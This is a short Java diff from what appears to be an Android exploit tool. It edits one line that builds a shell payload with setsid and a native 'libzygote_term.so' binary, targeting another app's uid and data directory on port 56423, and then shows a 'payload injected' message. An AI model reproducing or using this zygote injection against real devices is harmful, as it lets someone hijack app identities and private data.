@@ -396,7 +396,7 @@ private void toggleAdvancedSettings() {
               runpayload(android1213);
                                 
                         } else {
-            runpayload(replaceSetIds(Get_Payload(),uid+"",uid+"",editTextPreferenceeee.getText().toString())+"echo \"$(setsid " + getActivity().getApplicationInfo().nativeLibraryDir+"/libzygote_term.so "+uid+" --app-dir=/data/data/"+editText.getText().toString()+":56423);"+payload_buffer());
+            runpayload(replaceSetIds(Get_Payload(),uid+"",uid+"",editTextPreferenceeee.getText().toString())+"echo $(setsid " + getActivity().getApplicationInfo().nativeLibraryDir+"/libzygote_term.so "+uid+" --app-dir=/data/data/"+editText.getText().toString()+":56423);"+payload_buffer());
         }
                             Snackbar snackbar = Snackbar.make(getView(), "payload已注入", Snackbar.LENGTH_SHORT);
         snackbar.setAction("ok", new View.OnClickListener() {
